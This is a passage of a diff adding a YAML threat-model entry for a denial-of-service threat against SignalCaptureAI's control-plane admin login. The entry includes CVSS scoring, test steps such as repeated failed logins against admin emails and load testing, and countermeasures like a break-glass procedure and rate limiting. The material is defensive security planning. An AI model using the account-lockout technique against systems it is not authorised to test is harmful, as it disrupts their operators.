+      accounts, rendering the control plane inaccessible. Either attack prevents new tenant
+      provisioning and emergency deletion operations.
+    impactDesc: >
+      SignalCaptureAI cannot provision new tenants during a sales period, directly impacting revenue.
+      Emergency tenant deletion requests (e.g., legal or breach response) cannot be processed.
+      If the attack coincides with a security incident requiring urgent tenant suspension, the
+      consequence is compounded by the inability to respond.
+    impactedSecObj:
+      - SO-AVAIL
+    attackers:
+      - ATT_EXTERNAL
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      score: 7.5
+      severity: "High"
+    fullyMitigated: false
+    alwaysPresent: false
+
+    testPrerequisites:
+      - "Knowledge of a CC admin email address (discoverable from company website or LinkedIn)"
+      - "A load testing tool configured for the CC login endpoint"
+      - "WorkOS test organisation to simulate lockout behavior"
+
+    testSteps:
+      - "Submit 10 consecutive failed login attempts for a known CC admin email address"
+      - "Observe whether the WorkOS CC organisation locks the account — and verify the lockout duration"
+      - "Verify whether a lockout for all CC admin accounts simultaneously prevents any operational CC access"
+      - "Check whether the CC application has a documented break-glass procedure for account lockout recovery"
+      - "Run a low-rate load test (50 concurrent requests) against the CC login endpoint and observe response times"
+      - "Verify Azure Container Apps auto-scales or rate-limits excessive login requests independently of WorkOS"
+
+    testTools:
+      - "WorkOS Dashboard (monitor authentication events and lockout incidents)"
+      - "k6 or Locust (load test the CC login endpoint)"
+      - "Azure Application Insights (monitor response latency under load)"
+
+    expectedBehavior: >
+      Repeated failed login attempts lock all CC admin accounts simultaneously. No break-glass
+      procedure exists. The CC application is unreachable during an account lockout event.
+      No auto-scaling or rate-limiting is configured on the application layer.
+
+    expectedMitigation: >
+      WorkOS lockout policy is configured with a maximum lockout duration of 30 minutes and
+      admin unlock via a separate out-of-band WorkOS management account. A break-glass procedure
+      exists and is tested quarterly. Azure App Service is configured with auto-scaling rules
+      and rate-limiting on the login endpoint.
+
+    countermeasures:
+      - ID: CM_010_BREAK_GLASS
+        title: "Define and Test a Break-Glass Procedure for CC Admin Lockout Recovery"
+        description: >
+          Document and periodically test a procedure for recovering CC admin access if all
+          operational accounts are locked out, using a separate emergency WorkOS Admin API
+          account held offline by the founding team.
+        status: "not_started"
+        effort: "Low"
+        why: >
+          A DoS via account lockout is most dangerous when it blocks emergency response.
+          A documented, tested break-glass path ensures the business can always unlock
+          access within a defined recovery time objective.
+        implementation:
+          - "Create a dedicated WorkOS Admin API key for emergency admin unlock"
+          - "Store the API key in an offline secret (e.g., a password manager accessible only to the CEO and CTO)"
+          - "Document the break-glass procedure: how to use the API key to unlock a specific user account via WorkOS Admin API"
+          - "Test the break-glass procedure quarterly by simulating a lockout in a test WorkOS organisation"
+          - "Set a Recovery Time Objective (RTO) of 15 minutes for CC admin access restoration after a lockout event"
+
+      - ID: CM_010_RATE_LIMIT
+        title: "Apply Network-Level Rate Limiting on the CC Application Login Endpoint"
+        description: >
+          Configure Azure App Service access restrictions or Azure Front Door rate-limiting rules
+          to limit login request rates per source IP, independent of WorkOS's application-level
+          rate limits.
+        status: "not_started"
+        effort: "Medium"
+        why: >
+          WorkOS rate limits may not engage quickly enough at the network level for a high-volume
+          flood. A network-layer rate limit throttles the attack before it reaches WorkOS,
+          preserving WorkOS request quota and application responsiveness.
+        implementation:
+          - "In Azure Container Apps ingress settings: configure IP-based access restrictions for the CC login endpoint"
+          - "For external admin access (remote work): require VPN connection before CC is accessible — restrict CC to VPN egress IPs only"
+          - "If CC must be internet-accessible: deploy Azure Front Door with rate-limiting rules (max 20 requests per IP per minute on /login)"
+          - "Configure Azure DDoS Protection Standard on the CC application's public IP"
+          - "Alert on any source IP exceeding 10 failed login attempts within 5 minutes"
+
